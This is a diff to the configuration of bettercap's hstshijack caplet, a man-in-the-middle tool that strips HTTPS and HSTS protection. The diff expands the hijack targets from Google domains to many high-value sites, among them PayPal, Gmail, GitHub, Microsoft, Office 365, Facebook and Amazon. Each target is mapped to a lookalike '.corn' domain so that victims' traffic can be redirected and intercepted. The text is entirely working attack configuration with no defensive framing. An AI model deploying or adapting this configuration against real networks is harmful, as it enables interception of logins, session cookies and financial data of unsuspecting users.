@@ -2,8 +2,8 @@
 
 # Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'
 # variables get precendence over those assigned to the 'hstshijack.ignore' variable.
-set hstshijack.targets         google.com, *.google.com, gstatic.com, *.gstatic.com
-set hstshijack.replacements    google.corn,*.google.corn,gstatic.corn,*.gstatic.corn
+set hstshijack.targets         google.com,*.google.com,gstatic.com,*.gstatic.com,facebook.com,*.facebook.com,github.com,*.github.com,amazon.com,*.amazon.com,gmail.com,mail.google.com,twitter.com,*.twitter.com,instagram.com,*.instagram.com,linkedin.com,*.linkedin.com,reddit.com,*.reddit.com,youtube.com,*.youtube.com,netflix.com,*.netflix.com,paypal.com,*.paypal.com,apple.com,*.apple.com,microsoft.com,*.microsoft.com,office365.com,*.office365.com
+set hstshijack.replacements    google.corn,*.google.corn,gstatic.corn,*.gstatic.corn,facebook.corn,*.facebook.corn,github.corn,*.github.corn,amazon.corn,*.amazon.corn,gmail.corn,mail.google.corn,twitter.corn,*.twitter.corn,instagram.corn,*.instagram.corn,linkedin.corn,*.linkedin.corn,reddit.corn,*.reddit.corn,youtube.corn,*.youtube.corn,netflix.corn,*.netflix.corn,paypal.corn,*.paypal.corn,apple.corn,*.apple.corn,microsoft.corn,*.microsoft.corn,office365.corn,*.office365.corn
 set hstshijack.ssl.domains     /usr/share/bettercap/caplets/hstshijack/domains.txt
 set hstshijack.ssl.index       /usr/share/bettercap/caplets/hstshijack/index.json
 set hstshijack.ssl.check       true
